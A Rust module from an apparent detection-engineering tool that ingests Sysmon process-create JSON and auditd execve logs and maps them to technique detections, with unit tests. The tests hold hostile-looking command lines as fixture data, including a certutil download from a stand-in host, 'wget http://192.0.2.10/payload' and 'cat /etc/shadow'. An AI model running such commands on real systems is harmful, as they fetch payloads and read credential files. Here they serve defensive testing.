//! Ingest recorded host telemetry — the events a sensor actually logged — and
//! reduce each to the [`Command`]s the analyzer already understands. This is the
//! complement to opseclint's predictive mode: instead of *predicting* the
//! telemetry a command would emit, it takes real telemetry and maps it back to
//! techniques, detectability, and coverage, answering "given what the sensor
//! recorded, which techniques does this represent?"
//!
//! Two sources are supported, both reducing to the same `Command` the analyzer
//! already understands so the matcher, report, and Sigma evaluation run
//! unchanged — no new matching layer:
//!
//! - Windows **Sysmon Event ID 1** (Process Create), exported as JSON. Its
//!   `Image` / `CommandLine` / `OriginalFileName` fields are exactly the event
//!   model [`crate::sigma_eval`] synthesizes from a command line.
//! - Linux **auditd** `execve` events, as raw `audit.log` text. The multi-line
//!   `SYSCALL` / `EXECVE` / `CWD` records of one event are reassembled by their
//!   `audit(…)` id, the argv rebuilt from the `EXECVE` fields, and the program
//!   taken from the `SYSCALL` `exe` path.
//!
//! This is an *observation* front-end: it describes what a defender's sensor
//! saw. Like the rest of opseclint it encodes detectability only, never evasion.
//!
//! Only process-execution records are ingested. A file that mixes in other event
//! classes (network / file / registry) has those records **skipped and
//! counted** — surfaced to the user, never silently dropped.

use std::collections::HashMap;
use std::sync::Arc;

use serde_json::Value;

use crate::parser::{self, Command};

/// A telemetry format opseclint can ingest. Windows Sysmon EID 1 and Linux
/// auditd `execve` are the current cuts; macOS/ESF lands as a further format
/// behind the same `--telemetry` input path.
#[derive(Debug, Clone, Copy, PartialEq, Eq, clap::ValueEnum)]
pub enum Format {
    /// Windows Sysmon Event ID 1 (Process Create), JSON — a top-level array of
    /// event objects, or one JSON object per line (JSONL).
    Sysmon,
    /// Linux auditd process-execution events, raw `audit.log` text — the
    /// multi-line `SYSCALL` / `EXECVE` / `CWD` records for one `execve`,
    /// reassembled by their `audit(…)` event id.
    Auditd,
}

/// One ingested telemetry record reduced to the analyzer's unit shape: the
/// commands resolved from the event, the raw command line the sensor recorded,
/// and the field map of the event. `record` is the 1-based position of the
/// source record (used as the finding's line number, so a finding points back at
/// the record it came from). `event` carries the fields a command line can't
/// supply — `ParentImage`, `User`, `IntegrityLevel`, … — so Sigma evaluation can
/// resolve rules keyed on them against the real event. Known Sysmon EID 1 fields
/// are keyed by their canonical name (see `canonical_field`); any other keys
/// keep their original casing. Wrapped in an `Arc` so the several findings a
/// record produces share one map instead of each deep-cloning it.
#[derive(Debug, Clone)]
pub struct Observation {
    pub record: usize,
    pub commands: Vec<Command>,
    pub raw: String,
    pub event: Arc<HashMap<String, String>>,
}

/// The result of ingesting a telemetry file: the process-execution observations
/// to analyze, and how many records were skipped because they are not
/// process-execution events.
#[derive(Debug, Clone)]
pub struct Ingest {
    pub observations: Vec<Observation>,
    pub skipped: usize,
}

/// Parse recorded telemetry `text` in the given `format` into observations.
pub fn parse(text: &str, format: Format) -> Result<Ingest, String> {
    match format {
        Format::Sysmon => parse_sysmon(text),
        Format::Auditd => parse_auditd(text),
    }
}

fn parse_sysmon(text: &str) -> Result<Ingest, String> {
    let events = read_events(text)?;
    let mut observations = Vec::new();
    let mut skipped = 0;
    for (i, ev) in events.iter().enumerate() {
        let fields = flatten_fields(ev);
        match reduce_process_create(&fields) {
            Some((commands, raw)) => observations.push(Observation {
                record: i + 1,
                commands,
                raw,
                event: Arc::new(fields),
            }),
            None => skipped += 1,
        }
    }
    Ok(Ingest {
        observations,
        skipped,
    })
}

/// Canonical Sysmon Event ID 1 field names. Ingested records arrive with varied
/// casing and nesting; canonicalizing on the way in lets both the reduction and
/// the Sigma evaluator address a field by the standard name a rule references
/// (e.g. a `ParentImage|endswith` selection). Unrecognized keys are kept as-is.
const SYSMON_FIELDS: &[&str] = &[
    "EventID",
    "Image",
    "CommandLine",
    "OriginalFileName",
    "CurrentDirectory",
    "User",
    "IntegrityLevel",
    "Hashes",
    "Company",
    "Description",
    "Product",
    "FileVersion",
    "ParentImage",
    "ParentCommandLine",
    "ParentUser",
    "ParentProcessId",
    "ProcessId",
    "LogonId",
    "TerminalSessionId",
];

/// Map an incoming field key to its canonical Sysmon name (case-insensitively),
/// normalizing the Elastic `winlog` `event_id` alias to `EventID`.
fn canonical_field(key: &str) -> String {
    if key.eq_ignore_ascii_case("event_id") {
        return "EventID".to_string();
    }
    SYSMON_FIELDS
        .iter()
        .find(|f| key.eq_ignore_ascii_case(f))
        .map(|f| f.to_string())
        .unwrap_or_else(|| key.to_string())
}

/// Read a telemetry document into a flat list of event values, accepting the
/// three shapes real exporters produce: a top-level JSON array of events, a
/// single JSON object, or JSONL (one JSON object per line).
fn read_events(text: &str) -> Result<Vec<Value>, String> {
    let trimmed = text.trim_start();
    if trimmed.starts_with('[') {
        let v: Value =
            serde_json::from_str(text).map_err(|e| format!("invalid JSON array: {e}"))?;
        return match v {
            Value::Array(items) => Ok(items),
            _ => Err("expected a JSON array of events".to_string()),
        };
    }
    // A single JSON object spanning the whole input (possibly pretty-printed).
    if trimmed.starts_with('{')
        && let Ok(v) = serde_json::from_str::<Value>(text)
    {
        return Ok(vec![v]);
    }
    // JSONL: one JSON value per non-empty line.
    let mut out = Vec::new();
    for (n, line) in text.lines().enumerate() {
        let l = line.trim();
        if l.is_empty() {
            continue;
        }
        let v: Value =
            serde_json::from_str(l).map_err(|e| format!("invalid JSON on line {}: {e}", n + 1))?;
        out.push(v);
    }
    if out.is_empty() {
        return Err("no telemetry records found".to_string());
    }
    Ok(out)
}

/// Flatten an event object into a map of scalar fields keyed by canonical Sysmon
/// field name, descending through the container objects different exporters wrap
/// event data in (`EventData`, Elastic's `winlog.event_data`, an outer `Event`,
/// …) and the EVTX→JSON `{ "@Name": "Image", "#text": "…" }` array shape.
/// Top-level scalars win over nested ones, which is correct: flat Sysmon JSON
/// carries the fields at the top level, and the nested shapes carry them only
/// when the top level does not. Canonical names let the reduction and the Sigma
/// evaluator address a field by the standard name a rule references.
fn flatten_fields(ev: &Value) -> HashMap<String, String> {
    let mut out = HashMap::new();
    collect_scalars(ev, &mut out, 0);
    out
}

fn collect_scalars(v: &Value, out: &mut HashMap<String, String>, depth: usize) {
    // Guard against pathological nesting; real telemetry wraps two, maybe three
    // levels deep.
    if depth > 4 {
        return;
    }
    let Some(map) = v.as_object() else { return };

    // Two passes so precedence is by depth, not by key order: insert every
    // scalar at this level first, then descend. With `or_insert` (first write
    // wins), a shallower field always wins over an equivalent deeper one —
    // regardless of the order the serializer yields keys in. That is what makes
    // a flat top-level field win over the same field nested in `EventData`.
    for (k, val) in map {
        if let Some(s) = value_scalar(val) {
            out.entry(canonical_field(k)).or_insert(s);
        }
    }
    for val in map.values() {
        match val {
            Value::Object(_) => collect_scalars(val, out, depth + 1),
            Value::Array(items) => {
                for item in items {
                    // The EVTX→JSON name/value shape: each entry names one field.
                    let obj = item.as_object();
                    let name = obj
                        .and_then(|o| o.get("@Name").or_else(|| o.get("Name")))
                        .and_then(Value::as_str);
                    let text = obj.and_then(|o| o.get("#text").or_else(|| o.get("text")));
                    match (name, text) {
                        (Some(name), Some(text)) => {
                            if let Some(s) = value_scalar(text) {
                                out.entry(canonical_field(name)).or_insert(s);
                            }
                        }
                        _ => collect_scalars(item, out, depth + 1),
                    }
                }
            }
            _ => {}
        }
    }
}

fn value_scalar(v: &Value) -> Option<String> {
    match v {
        Value::String(s) => Some(s.clone()),
        Value::Number(n) => Some(n.to_string()),
        Value::Bool(b) => Some(b.to_string()),
        _ => None,
    }
}

/// Reduce a flattened event to `(commands, raw)` if it is a process-creation
/// record, else `None` (so the caller can count it as skipped).
///
/// A record is process-creation when its event id is `1`, or — when no event id
/// is present (some Sysmon-only EID 1 exports omit it) — when it carries a
/// command line. Requiring the command line in the id-less case is what keeps a
/// network (EID 3) or file (EID 11) record, which carries an `Image` but no
/// `CommandLine`, from being misread as a process launch.
fn reduce_process_create(fields: &HashMap<String, String>) -> Option<(Vec<Command>, String)> {
    // Fields are canonically named by `flatten_fields`, so the Sysmon standard
    // names address them directly.
    let event_id = fields.get("EventID");
    let command_line = fields.get("CommandLine").map(String::as_str).unwrap_or("");
    let is_process_create = match event_id {
        Some(id) => id.trim() == "1",
        None => !command_line.trim().is_empty(),
    };
    if !is_process_create {
        return None;
    }
    execution_from_fields(fields)
}

/// Resolve `(commands, raw)` for a process launch from a canonical field map,
/// shared by every ingest format. Prefers the recorded `CommandLine` as the raw
/// text, falling back to the `Image` path when no command line was logged; then
/// tokenizes it with the shell parser (wrapper stripping, quote handling, and
/// compound-line splitting all come for free) and trusts `Image` for the primary
/// program's basename — the authoritative executable path, matched with the same
/// normalization the KB keys on. `None` when there is nothing to analyze.
fn execution_from_fields(fields: &HashMap<String, String>) -> Option<(Vec<Command>, String)> {
    let command_line = fields.get("CommandLine").map(String::as_str).unwrap_or("");
    let image = fields.get("Image").map(String::as_str).unwrap_or("");
    let raw = if command_line.trim().is_empty() {
        image.to_string()
    } else {
        command_line.to_string()
    };
    if raw.trim().is_empty() {
        return None;
    }

    let mut commands = parser::parse_line(&raw);
    if !image.trim().is_empty() {
        let program = parser::basename(image);
        match commands.first_mut() {
            Some(first) => first.program = program,
            None => commands.push(Command {
                program,
                args: Vec::new(),
                raw: raw.clone(),
            }),
        }
    }
    Some((commands, raw))
}

// ---------------------------------------------------------------------------
// Linux auditd
// ---------------------------------------------------------------------------

/// One parsed auditd record line: its `type`, the `audit(…)` event id that ties
/// the multi-line records of a single event together, and its `key=value`
/// fields (values kept as the raw token — quoted or hex — for `decode_value`).
struct AuditRecord {
    kind: String,
    event_id: String,
    fields: HashMap<String, String>,
}

/// Ingest raw auditd log text. Records are reassembled into events by their
/// `audit(<ts>:<serial>)` id; an event that carries an `EXECVE` record is a
/// process execution and reduces to a `Command`, with the argv rebuilt from the
/// `EXECVE` `a0…aN` fields, the program from the `SYSCALL` `exe` path, and the
/// working directory from the `CWD` record. Every other event class (a `connect`,
/// an `open`, …) carries no `EXECVE` and is skipped and counted.
///
/// Only fields opseclint can map honestly are carried onto the event: auditd
/// records the parent as a numeric `ppid` (no path), so `ParentImage` is absent
/// and parent-keyed rules stay indeterminate; and it records a numeric `uid`,
/// which is deliberately not mapped onto the name-based `User` field to avoid a
/// false `no-fire` against a rule expecting `root`.
fn parse_auditd(text: &str) -> Result<Ingest, String> {
    let mut order: Vec<String> = Vec::new();
    let mut groups: HashMap<String, Vec<AuditRecord>> = HashMap::new();
    for line in text.lines() {
        if let Some(rec) = parse_audit_record(line) {
            if !groups.contains_key(&rec.event_id) {
                order.push(rec.event_id.clone());
            }
            groups.entry(rec.event_id.clone()).or_default().push(rec);
        }
    }
    if order.is_empty() {
        return Err("no auditd records found".to_string());
    }

    let mut observations = Vec::new();
    let mut skipped = 0;
    for (idx, id) in order.iter().enumerate() {
        let recs = &groups[id];
        let execve = recs.iter().find(|r| r.kind == "EXECVE");
        // An EXECVE record is emitted only for execve/execveat, so its presence
        // is an arch-independent signal that this event is a process launch.
        let Some(execve) = execve else {
            skipped += 1;
            continue;
        };

        let mut fields = HashMap::new();
        let cmdline = build_execve_cmdline(&execve.fields);
        if !cmdline.is_empty() {
            fields.insert("CommandLine".to_string(), cmdline);
        }
        if let Some(syscall) = recs.iter().find(|r| r.kind == "SYSCALL")
            && let Some(exe) = syscall.fields.get("exe")
        {
            let exe = decode_value(exe);
            if !exe.is_empty() {
                fields.insert("Image".to_string(), exe);
            }
        }
        if let Some(cwd) = recs.iter().find(|r| r.kind == "CWD")
            && let Some(dir) = cwd.fields.get("cwd")
        {
            let dir = decode_value(dir);
            if !dir.is_empty() {
                fields.insert("CurrentDirectory".to_string(), dir);
            }
        }

        match execution_from_fields(&fields) {
            Some((commands, raw)) => observations.push(Observation {
                // The event's ordinal position in the source log (skipped events
                // consume a number too), so a finding points back at the right
                // event — matching the Sysmon path's `record`.
                record: idx + 1,
                commands,
                raw,
                event: Arc::new(fields),
            }),
            None => skipped += 1,
        }
    }
    Ok(Ingest {
        observations,
        skipped,
    })
}

/// Parse one auditd log line into a record, or `None` if it is not an
/// `type=… msg=audit(…)` line (blank lines, `ausearch` `----` separators, …).
fn parse_audit_record(line: &str) -> Option<AuditRecord> {
    let fields = parse_kv(line);
    let kind = fields.get("type").map(|v| decode_value(v))?;
    let event_id = fields.get("msg").and_then(|m| event_id_from_msg(m))?;
    Some(AuditRecord {
        kind,
        event_id,
        fields,
    })
}

/// Extract the `<ts>:<serial>` event id from an auditd `msg` value such as
/// `audit(1626898254.123:45)`. The exact timestamp shape doesn't matter — the
/// same string across an event's records is all that's needed to group them.
fn event_id_from_msg(msg: &str) -> Option<String> {
    let start = msg.find("audit(")? + "audit(".len();
    let end = msg[start..].find(')')? + start;
    Some(msg[start..end].to_string())
}

/// Rebuild an `execve` command line from an `EXECVE` record's `a0`, `a1`, …
/// argument fields, in order, each decoded (quoted or hex). Stops at the first
/// gap. Argument chunking (`a1_len` + `a1[0]`…) for oversized args is not
/// reassembled — a documented limitation.
///
/// auditd hands us the *exact* argv, already split; the shared reducer then
/// re-tokenizes the joined line with the shell parser. So each argument is
/// re-quoted if it holds anything the parser would act on (whitespace, quotes, a
/// separator), keeping the reconstructed boundaries identical to what the sensor
/// recorded rather than letting one argument split into several.
fn build_execve_cmdline(fields: &HashMap<String, String>) -> String {
    let mut args = Vec::new();
    let mut i = 0;
    while let Some(v) = fields.get(&format!("a{i}")) {
        args.push(shell_quote_arg(&decode_value(v)));
        i += 1;
    }
    args.join(" ")
}

/// Quote a decoded argv element for the shell tokenizer so it round-trips as one
/// token. Values made only of characters the parser treats literally are left
/// bare; anything else is wrapped in a quote it does not itself contain (double
/// preferred). The parser toggles on quotes without honoring backslash escapes,
/// so an argument holding *both* quote kinds can't round-trip perfectly — a rare,
/// documented edge that is no worse than leaving it unquoted.
fn shell_quote_arg(arg: &str) -> String {
    let is_bare = !arg.is_empty()
        && arg.bytes().all(|b| {
            b.is_ascii_alphanumeric()
                || matches!(
                    b,
                    b'-' | b'_' | b'.' | b'/' | b':' | b'=' | b'@' | b',' | b'+' | b'%'
                )
        });
    if is_bare {
        return arg.to_string();
    }
    if !arg.contains('"') {
        format!("\"{arg}\"")
    } else {
        format!("'{arg}'")
    }
}

/// Decode an auditd field value: strip surrounding quotes, or hex-decode when it
/// is an unquoted even-length run of hex digits (auditd hex-encodes values that
/// contain spaces, quotes, or control characters). Anything else is literal.
/// Applied only to string-valued fields (`exe`, `cwd`, argv), never to numeric
/// ones like `uid`, so a value like `pid=5678` is never mistaken for hex.
fn decode_value(v: &str) -> String {
    let v = v.trim();
    if v.len() >= 2 && v.starts_with('"') && v.ends_with('"') {
        return v[1..v.len() - 1].to_string();
    }
    if v.len() >= 2
        && v.len().is_multiple_of(2)
        && v.bytes().all(|b| b.is_ascii_hexdigit())
        && let Some(decoded) = hex_decode(v)
    {
        return decoded;
    }
    v.to_string()
}

/// Decode a hex string to UTF-8, or `None` if it isn't valid UTF-8. auditd uses
/// a NUL to separate concatenated fields (e.g. proctitle); a trailing NUL is
/// trimmed so a decoded exe path stays clean.
fn hex_decode(s: &str) -> Option<String> {
    let bytes: Option<Vec<u8>> = (0..s.len())
        .step_by(2)
        .map(|i| u8::from_str_radix(&s[i..i + 2], 16).ok())
        .collect();
    let mut bytes = bytes?;
    while bytes.last() == Some(&0) {
        bytes.pop();
    }
    String::from_utf8(bytes).ok()
}

/// Parse a line of space-separated auditd `key=value` tokens into a map,
/// respecting double-quoted values that contain spaces. Values are stored as
/// their raw token (quotes/hex intact) for `decode_value` to interpret. Tokens
/// without `=` (a leading `node=` is a normal kv; a bare word is not) are
/// skipped.
fn parse_kv(s: &str) -> HashMap<String, String> {
    let mut out = HashMap::new();
    let bytes = s.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        while i < bytes.len() && bytes[i] == b' ' {
            i += 1;
        }
        if i >= bytes.len() {
            break;
        }
        let key_start = i;
        while i < bytes.len() && bytes[i] != b'=' && bytes[i] != b' ' {
            i += 1;
        }
        if i >= bytes.len() || bytes[i] != b'=' {
            // No '=': skip to the next token.
            while i < bytes.len() && bytes[i] != b' ' {
                i += 1;
            }
            continue;
        }
        let key = &s[key_start..i];
        i += 1; // skip '='
        let val_start = i;
        let val_end = if i < bytes.len() && bytes[i] == b'"' {
            i += 1;
            while i < bytes.len() && bytes[i] != b'"' {
                i += 1;
            }
            if i < bytes.len() {
                i += 1; // include the closing quote
            }
            i
        } else {
            while i < bytes.len() && bytes[i] != b' ' {
                i += 1;
            }
            i
        };
        out.insert(key.to_string(), s[val_start..val_end].to_string());
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::analyzer;
    use crate::kb;
    use crate::model::KnowledgeBase;
    use std::path::PathBuf;

    fn fixture(name: &str) -> String {
        let path = PathBuf::from(env!("CARGO_MANIFEST_DIR"))
            .join("tests/fixtures/telemetry")
            .join(name);
        std::fs::read_to_string(&path).unwrap_or_else(|e| panic!("read {}: {e}", path.display()))
    }

    fn win_kb() -> KnowledgeBase {
        kb::load(kb::Platform::WindowsSysmon).expect("windows KB must parse")
    }

    fn lnx_kb() -> KnowledgeBase {
        kb::load(kb::Platform::LinuxAuditd).expect("linux KB must parse")
    }

    fn ids(report: &crate::model::Report) -> Vec<String> {
        report.findings.iter().map(|f| f.rule_id.clone()).collect()
    }

    #[test]
    fn ingests_sysmon_array_and_skips_non_process_events() {
        let ingest = parse(&fixture("sysmon-eid1.json"), Format::Sysmon).expect("parses");
        // Three EID 1 process events; the lone EID 3 network record is skipped.
        assert_eq!(ingest.observations.len(), 3);
        assert_eq!(ingest.skipped, 1);
        // Record numbers reflect source position (the skipped record is #4).
        assert_eq!(
            ingest
                .observations
                .iter()
                .map(|o| o.record)
                .collect::<Vec<_>>(),
            vec![1, 2, 3]
        );
    }

    #[test]
    fn analyzes_ingested_sysmon_events_via_the_existing_matcher() {
        let ingest = parse(&fixture("sysmon-eid1.json"), Format::Sysmon).expect("parses");
        let report = analyzer::analyze_telemetry(&ingest.observations, &win_kb());
        let ids = ids(&report);
        // The malicious process-creation events map to their KB entries…
        assert!(ids.contains(&"certutil-download".to_string()));
        assert!(ids.contains(&"lsass-comsvcs".to_string()));
        // …and the finding points back at the record it came from.
        let certutil = report
            .findings
            .iter()
            .find(|f| f.rule_id == "certutil-download")
            .unwrap();
        assert_eq!(certutil.line, 1);
    }

    #[test]
    fn image_is_authoritative_for_the_program_basename() {
        // A single flat event: the program comes from `Image` (path-stripped,
        // `.exe`-normalized), matching how the KB resolves a program.
        let ev = r#"{"EventID":1,"Image":"C:\\Windows\\System32\\certutil.exe","CommandLine":"certutil -urlcache -f http://x/a a"}"#;
        let ingest = parse(ev, Format::Sysmon).expect("parses");
        assert_eq!(ingest.observations.len(), 1);
        assert_eq!(ingest.observations[0].commands[0].program, "certutil");
    }

    #[test]
    fn ingests_jsonl_with_nested_event_data() {
        // JSONL, exercising the `EventData` and Elastic `winlog.event_data`
        // nesting shapes.
        let ingest = parse(&fixture("sysmon-eid1.jsonl"), Format::Sysmon).expect("parses");
        assert_eq!(ingest.observations.len(), 2);
        assert_eq!(ingest.skipped, 0);
        let report = analyzer::analyze_telemetry(&ingest.observations, &win_kb());
        let ids = ids(&report);
        assert!(ids.contains(&"vssadmin-delete".to_string()));
        assert!(ids.contains(&"net-user".to_string()));
    }

    #[test]
    fn network_event_without_a_command_line_is_not_a_process_create() {
        // Sysmon EID 3 (network connection) carries an Image but no CommandLine;
        // even with the event id stripped it must not be read as a process.
        let mut fields = HashMap::new();
        fields.insert(
            "Image".to_string(),
            "C:\\Windows\\System32\\svchost.exe".to_string(),
        );
        fields.insert("DestinationIp".to_string(), "192.0.2.1".to_string());
        assert!(reduce_process_create(&fields).is_none());
    }

    #[test]
    fn observed_mode_agrees_with_predictive_mode() {
        // The same command, seen as recorded telemetry or predicted from text,
        // must resolve to the same findings — the two modes share one matcher.
        let cmdline = "certutil.exe -urlcache -f http://x/a.exe a.exe";
        let ev = format!(
            r#"{{"EventID":1,"Image":"C:\\Windows\\System32\\certutil.exe","CommandLine":"{cmdline}"}}"#
        );
        let ingest = parse(&ev, Format::Sysmon).expect("parses");
        let observed = ids(&analyzer::analyze_telemetry(
            &ingest.observations,
            &win_kb(),
        ));
        let predicted = ids(&analyzer::analyze(cmdline, &win_kb()));
        let set = |v: Vec<String>| v.into_iter().collect::<std::collections::BTreeSet<_>>();
        assert_eq!(set(observed), set(predicted));
    }

    #[test]
    fn top_level_field_wins_over_a_nested_duplicate() {
        // When a record carries the same field both flat and nested, the
        // top-level value wins — deterministically, regardless of key order.
        let ev = r#"{
            "EventData": { "Image": "C:\\nested\\reg.exe", "CommandLine": "reg query HKLM" },
            "Image": "C:\\Windows\\System32\\certutil.exe",
            "EventID": 1
        }"#;
        let value: serde_json::Value = serde_json::from_str(ev).unwrap();
        let fields = flatten_fields(&value);
        assert_eq!(
            fields.get("Image").map(String::as_str),
            Some("C:\\Windows\\System32\\certutil.exe")
        );
        // The nested-only field is still collected.
        assert_eq!(
            fields.get("CommandLine").map(String::as_str),
            Some("reg query HKLM")
        );
    }

    #[test]
    fn observation_carries_canonical_event_fields() {
        // The fields a command line can't supply are canonically named and kept
        // on the observation, so Sigma evaluation can consult them. Casing and
        // the Elastic `winlog` nesting are both normalized.
        let ev = r#"{"winlog":{"event_id":1,"event_data":{
            "Image":"C:\\Windows\\System32\\certutil.exe",
            "CommandLine":"certutil -urlcache -f http://x/a a",
            "parentimage":"C:\\Program Files\\Microsoft Office\\WINWORD.EXE",
            "IntegrityLevel":"Medium"
        }}}"#;
        let ingest = parse(ev, Format::Sysmon).expect("parses");
        let event = &ingest.observations[0].event;
        assert_eq!(event.get("EventID").map(String::as_str), Some("1"));
        assert_eq!(
            event.get("ParentImage").map(String::as_str),
            Some("C:\\Program Files\\Microsoft Office\\WINWORD.EXE")
        );
        assert_eq!(
            event.get("IntegrityLevel").map(String::as_str),
            Some("Medium")
        );
    }

    #[test]
    fn invalid_json_is_a_clear_error() {
        assert!(parse("not json at all", Format::Sysmon).is_err());
    }

    // --- auditd ------------------------------------------------------------

    #[test]
    fn ingests_auditd_execve_and_skips_non_exec() {
        let ingest = parse(&fixture("auditd-execve.log"), Format::Auditd).expect("parses");
        // Three execve events (cat, wget, whoami); the connect event (syscall 42,
        // no EXECVE record) is skipped.
        assert_eq!(ingest.observations.len(), 3);
        assert_eq!(ingest.skipped, 1);
        // Record numbers are the events' source positions: the skipped connect
        // event is #3, so whoami (the 4th event) is record 4 — not 3.
        assert_eq!(
            ingest
                .observations
                .iter()
                .map(|o| o.record)
                .collect::<Vec<_>>(),
            vec![1, 2, 4]
        );
    }

    #[test]
    fn analyzes_ingested_auditd_events_via_the_existing_matcher() {
        let ingest = parse(&fixture("auditd-execve.log"), Format::Auditd).expect("parses");
        let report = analyzer::analyze_telemetry(&ingest.observations, &lnx_kb());
        let ids = ids(&report);
        assert!(ids.contains(&"shadow-read".to_string()));
        assert!(ids.contains(&"wget".to_string()));
        assert!(ids.contains(&"whoami".to_string()));
    }

    #[test]
    fn auditd_rebuilds_argv_and_decodes_hex_and_quoted_values() {
        let ingest = parse(&fixture("auditd-execve.log"), Format::Auditd).expect("parses");
        // Event 2 (wget): the exe path and a0 arrive hex-encoded, the URL quoted.
        let wget = &ingest.observations[1];
        assert_eq!(wget.commands[0].program, "wget");
        assert_eq!(wget.raw, "wget http://192.0.2.10/payload");
        assert_eq!(
            wget.event.get("Image").map(String::as_str),
            Some("/usr/bin/wget")
        );
        // The working directory rides along from the CWD record for observed
        // Sigma evaluation.
        assert_eq!(
            wget.event.get("CurrentDirectory").map(String::as_str),
            Some("/tmp")
        );
        // Numeric uid is deliberately not mapped onto the name-based User field.
        assert!(wget.event.get("User").is_none());
    }

    #[test]
    fn auditd_reassembles_records_out_of_order() {
        // EXECVE before its SYSCALL, and an unrelated event interleaved: grouping
        // is by the audit(…) id, not adjacency.
        let log = "\
type=EXECVE msg=audit(10.0:1): argc=2 a0=\"cat\" a1=\"/etc/shadow\"
type=SYSCALL msg=audit(99.9:2): syscall=42 exe=\"/usr/bin/ss\"
type=SYSCALL msg=audit(10.0:1): syscall=59 exe=\"/usr/bin/cat\" uid=0
";
        let ingest = parse(log, Format::Auditd).expect("parses");
        assert_eq!(ingest.observations.len(), 1);
        assert_eq!(ingest.skipped, 1);
        assert_eq!(ingest.observations[0].raw, "cat /etc/shadow");
        assert_eq!(
            ingest.observations[0]
                .event
                .get("Image")
                .map(String::as_str),
            Some("/usr/bin/cat")
        );
    }

    #[test]
    fn decode_value_handles_quoted_hex_and_literal() {
        assert_eq!(decode_value("\"/usr/bin/cat\""), "/usr/bin/cat");
        assert_eq!(decode_value("2f7573722f62696e2f6361740000"), "/usr/bin/cat");
        assert_eq!(decode_value("/usr/bin/whoami"), "/usr/bin/whoami");
        // An even-length all-hex token like "5678" DOES decode (→ "Vx") — which
        // is exactly why decode_value is applied only to string fields (exe, cwd,
        // argv), never to numeric ones like uid/pid. Odd-length or non-hex always
        // passes through literally.
        assert_eq!(decode_value("5678"), "Vx");
        assert_eq!(decode_value("567"), "567");
    }

    #[test]
    fn auditd_preserves_argv_boundaries_across_whitespace_and_metachars() {
        // auditd hex-encodes argv values that contain spaces/quotes/separators.
        // Joining the exact argv must keep each element one token, not let the
        // shell parser re-split it. a2 = hex("hello world"), a3 = hex("a;b|c").
        let log = "\
type=SYSCALL msg=audit(1.0:1): syscall=59 exe=\"/usr/bin/grep\"
type=EXECVE msg=audit(1.0:1): argc=4 a0=\"grep\" a1=\"-r\" a2=68656c6c6f20776f726c64 a3=613b627c63
";
        let ingest = parse(log, Format::Auditd).expect("parses");
        let cmd = &ingest.observations[0].commands[0];
        assert_eq!(cmd.program, "grep");
        // The space- and separator-bearing args each survive as a single token.
        assert!(
            cmd.args.iter().any(|a| a == "hello world"),
            "expected 'hello world' as one arg, got {:?}",
            cmd.args
        );
        assert!(
            cmd.args.iter().any(|a| a == "a;b|c"),
            "expected 'a;b|c' as one arg, got {:?}",
            cmd.args
        );
    }

    #[test]
    fn empty_auditd_input_is_a_clear_error() {
        assert!(parse("", Format::Auditd).is_err());
        assert!(parse("---- \n#comment\n", Format::Auditd).is_err());
    }
}
